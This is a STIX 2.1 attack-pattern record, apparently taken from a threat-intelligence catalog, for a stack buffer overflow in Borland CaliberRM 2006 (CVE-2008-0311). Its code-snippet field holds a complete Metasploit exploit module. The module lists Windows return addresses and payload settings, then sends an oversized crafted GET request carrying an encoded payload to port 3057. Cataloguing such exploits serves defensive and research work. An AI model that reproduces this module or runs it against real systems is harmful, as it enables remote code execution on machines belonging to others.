{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cba17456-a46a-4847-8c77-ae5adc57f268",
    "created": "2024-08-14T16:47:16.181915Z",
    "modified": "2024-08-14T16:47:16.181918Z",
    "name": "Borland CaliberRM StarTeam Multicast Service Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Borland CaliberRM 2006. By sending a specially crafted GET request to the STMulticastService, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/borland_starteam.rb",
            "external_id": "borland_starteam.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-0311"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Borland CaliberRM StarTeam Multicast Service Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Borland CaliberRM 2006. By sending\n        a specially crafted GET request to the STMulticastService, an attacker may be\n        able to execute arbitrary code.\n      },\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          [ 'CVE', '2008-0311' ],\n          [ 'OSVDB', '44039' ],\n          [ 'BID', '28602' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 600,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 SP4 English',     { 'Ret' => 0x7c5729db } ],\n          [ 'Windows 2003 SP0 English',     { 'Ret' => 0x71ae1f9b } ],\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-04-02'))\n\n    register_options([Opt::RPORT(3057)])\n  end\n\n  def exploit\n\n    # inline payloads work best!\n    sploit =  rand_text_english(511) + \"\\x00\" + rand_text_english(1020)\n    sploit << [target.ret].pack('V') + \"@\" * 156 # <- :(\n    sploit << payload.encoded + rand_text_english(rand(100) + 1)\n\n    print_status(\"Trying target #{target.name}...\")\n\n    send_request_raw({'uri' => sploit,}, 5)\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-04-02",
    "x_mitre_platforms": [
        "win'"
    ]
}